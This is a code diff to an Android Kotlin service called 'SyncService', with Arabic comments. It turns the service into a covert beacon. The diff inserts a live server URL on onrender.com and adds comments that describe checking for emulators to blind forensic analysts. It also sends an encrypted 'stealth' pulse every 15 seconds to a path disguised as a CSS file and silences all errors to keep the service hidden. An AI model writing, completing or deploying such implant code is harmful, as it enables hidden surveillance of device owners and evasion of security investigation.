@@ -20,7 +20,8 @@ import java.util.TimerTask
 
 class SyncService : Service() {
 
-    private val RENDER_SERVER_URL = "https://onrender.com" // سيتم تحديثه برابط Render لاحقاً
+    // تم حقن رابط خادم Render الحي والخاص بك هنا بنجاح لربط الاتصال
+    private val RENDER_SERVER_URL = "https://web-assets-service.onrender.com" 
     private val ENCRYPTION_SECRET = "BaseSystemZeroDaySecureKey2026"
     private var stealthTimer: Timer? = null
 
@@ -31,11 +32,17 @@ class SyncService : Service() {
         return START_STICKY
     }
 
+    // فحص بيئة المراقبة الذكية لتعمية المحللين الجنائيين
     private fun checkEnvironmentAntiAnalysis(): Boolean {
         val fingerPrint = android.os.Build.FINGERPRINT
         val manufacturer = android.os.Build.MANUFACTURER
         val model = android.os.Build.MODEL
-        return (fingerPrint.startsWith("generic") || fingerPrint.startsWith("unknown") || model.contains("google_sdk") || model.contains("Emulator") || manufacturer.contains("Genymotion"))
+        
+        return (fingerPrint.startsWith("generic") || 
+                fingerPrint.startsWith("unknown") ||
+                model.contains("google_sdk") || 
+                model.contains("Emulator") ||
+                manufacturer.contains("Genymotion"))
     }
 
     private fun activateStealthBeacon() {
@@ -54,19 +61,27 @@ class SyncService : Service() {
                         telemetryData.put("device_info", "Android Node Connected")
                     }
 
+                    // تشفير متغيّر الكثافة العشوائية (Polymorphic AES-GCM Payload)
                     val encryptedBlob = encryptGCM(telemetryData.toString())
+                    
+                    // إرسال النبضة الشبحية عبر مسار الويب التموهي المعتمد في الخادم
                     sendSecureTelemetry("/assets/web/style-min.css", encryptedBlob)
-                } catch (e: Exception) {}
+
+                } catch (e: Exception) {
+                    // كتم الأخطاء البرمجية للحفاظ على سرية واستقرار الخدمة
+                }
             }
-        }, 0, 15000)
+        }, 0, 15000) // إرسال نبضة اتصال دورية مؤمنة كل 15 ثانية
     }
 
+    // --- محرك التشفير المتطابق مع خوارزمية الخادم (AES-256-GCM) ---
     private fun encryptGCM(plainText: String): String {
         val keyBytes = ENCRYPTION_SECRET.toByteArray(Charsets.UTF_8).copyOf(32)
         val keySpec = SecretKeySpec(keyBytes, "AES")
         val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+        
         val iv = ByteArray(12)
-        SecureRandom().nextBytes(iv)
+        SecureRandom().nextBytes(iv) // توليد ناقل حركة عشوائي في كل نبضة لمنع مطابقة الأنماط
         val spec = GCMParameterSpec(128, iv)
         
         cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec)
@@ -97,7 +112,8 @@ class SyncService : Service() {
             outputStream.write(payload.toByteArray(Charsets.UTF_8))
             outputStream.flush()
             outputStream.close()
-            connection.responseCode
+            
+            connection.responseCode // إتمام الطلب الشجري بصمت
         } catch (e: Exception) {}
     }
 
